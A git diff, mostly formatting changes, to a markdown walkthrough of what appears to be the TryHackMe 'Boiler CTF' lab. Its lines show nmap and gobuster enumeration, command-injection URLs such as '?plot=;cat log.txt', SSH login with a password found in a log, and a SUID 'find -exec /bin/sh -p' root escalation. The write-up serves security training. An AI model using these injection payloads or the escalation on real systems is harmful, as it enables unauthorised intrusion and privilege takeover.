@@ -79,11 +79,13 @@ Gain full system access to the target machine, then collect the **user flag** (f
 **Purpose:** full port discovery with service fingerprinting.
 
 **Command:**
+
 ```bash
 sudo nmap -sC -sV -p- 10.10.106.174
 ```
 
 **Flag explanation:**
+
 - `-sC` — run default NSE scripts (banner grabbing, version-specific probes)
 - `-sV` — service/version detection
 - `-p-` — all 65,535 ports
@@ -110,6 +112,7 @@ sudo nmap -sC -sV -p- 10.10.106.174
 **Purpose:** enumerate files accessible to anonymous users.
 
 **Commands:**
+
 ```bash
 ftp 10.10.106.174
 # Name: anonymous
@@ -120,12 +123,13 @@ get .info.txt
 
 **Outcome:** a hidden file `.info.txt` (74 bytes) was downloaded. The contents were ROT13-encoded:
 
-```
+```text
 Whfg jnagrq gb frr vs lbh sbhaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
 ```
 
 **Decoded:**
-```
+
+```text
 Just wanted to see if you found it. Lol. Remember: Enumeration is the key!
 ```
 
@@ -142,6 +146,7 @@ Just wanted to see if you found it. Lol. Remember: Enumeration is the key!
 **Purpose:** discover hidden directories on the web server.
 
 **Command:**
+
 ```bash
 gobuster dir -u http://10.10.106.174 -w /usr/share/dirb/wordlists/common.txt
 ```
@@ -166,12 +171,14 @@ gobuster dir -u http://10.10.106.174/joomla -w /usr/share/dirb/wordlists/common.
 **Purpose:** Joomla-specific vulnerability scan.
 
 **Commands:**
+
 ```bash
 sudo apt install joomscan
 joomscan --url http://10.10.106.174/joomla/
 ```
 
 **Outcome:**
+
 - **Joomla Version:** 3.9.10
 - **Core vulnerability check:** no known core vulnerabilities
 - Admin paths, component paths, template paths enumerated
@@ -192,20 +199,23 @@ joomscan --url http://10.10.106.174/joomla/
 **Tool:** Web browser (or curl) — the exploit is a single crafted URL.
 
 **Test for injection:**
-```
+
+```text
 http://10.10.106.174/joomla/_test/index.php?plot=;id
 ```
 
 The output of `id` appeared on the page (rendered inside the plot dropdown). This confirmed command injection.
 
 **List the directory to find hints:**
-```
+
+```text
 http://10.10.106.174/joomla/_test/index.php?plot=;ls
 http://10.10.106.174/joomla/_test/index.php?plot=;cat log.txt
 ```
 
 **Outcome:** `log.txt` contained lines like:
-```
+
+```text
 Aug 20 11:16:35 ... Accepted password for basterd from 10.1.1.1 ...
 #pass: superduperp@$$
 ```
@@ -226,6 +236,7 @@ Aug 20 11:16:35 ... Accepted password for basterd from 10.1.1.1 ...
 **Purpose:** use discovered credentials to establish an interactive shell on the non-standard SSH port.
 
 **Command:**
+
 ```bash
 ssh basterd@10.10.106.174 -p 55007
 # Password: superduperp@$$
@@ -243,11 +254,13 @@ ssh basterd@10.10.106.174 -p 55007
 **Purpose:** read script content; switch user.
 
 **Commands:**
+
 ```bash
 cat backup.sh
 ```
 
 **Content (excerpt):**
+
 ```bash
 #!/bin/bash
 USER=stoner
@@ -273,12 +286,14 @@ su stoner
 ## Step 8 — User Flag
 
 **Command:**
+
 ```bash
 cat /home/stoner/.secret
 ```
 
 **Output (paraphrased):**
-```
+
+```text
 You made it till here, well done.
 ```
 
@@ -294,12 +309,14 @@ You made it till here, well done.
 **Purpose:** locate binaries with the SUID bit set (run as owner regardless of invoker).
 
 **Command:**
+
 ```bash
 find / -perm -4000 2>/dev/null
 ```
 
 **Outcome:** standard SUID binaries present (`sudo`, `passwd`, `chsh`, etc.) plus an **unexpected** entry:
-```
+
+```text
 /usr/bin/find
 ```
 
@@ -316,18 +333,20 @@ SUID on `find` is a **known escape path** cataloged on GTFOBins.
 **Reference:** [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/#suid)
 
 **Command:**
+
 ```bash
 /usr/bin/find . -exec /bin/sh -p \; -quit
 ```
 
 **Flag explanation:**
+
 - `.` — search current directory
 - `-exec /bin/sh -p \;` — for each matching file, run `/bin/sh -p` (the `-p` flag preserves privileges — this is the critical flag that keeps the SUID-granted privileges when spawning the shell)
 - `-quit` — stop after the first match (we only need one shell)
 
 **Outcome:** spawned `/bin/sh` running as `root`.
 
-```
+```text
 # id
 uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner)
 ```
@@ -342,12 +361,14 @@ uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner)
 ## Step 11 — Root Flag
 
 **Command:**
+
 ```bash
 cat /root/root.txt
 ```
 
 **Output (paraphrased):**
-```
+
+```text
 It wasn't that hard, was it?
 ```
 
@@ -356,12 +377,13 @@ It wasn't that hard, was it?
 ![Root flag — /root/root.txt](../screenshots/wk13_boiler_ctf_18.png)
 ![TryHackMe room completion](../screenshots/wk13_boiler_ctf_19.png)
 ![Room progress screen](../screenshots/wk13_boiler_ctf_20.png)
+![Final summary](../screenshots/wk13_boiler_ctf_21.png)
 
 ---
 
 ## Attack Path Summary
 
-```
+```text
  Nmap discovers 4 ports
     │
     ├─ 21/tcp FTP (anon) ──────► .info.txt (ROT13) ── red herring, but confirms enum discipline
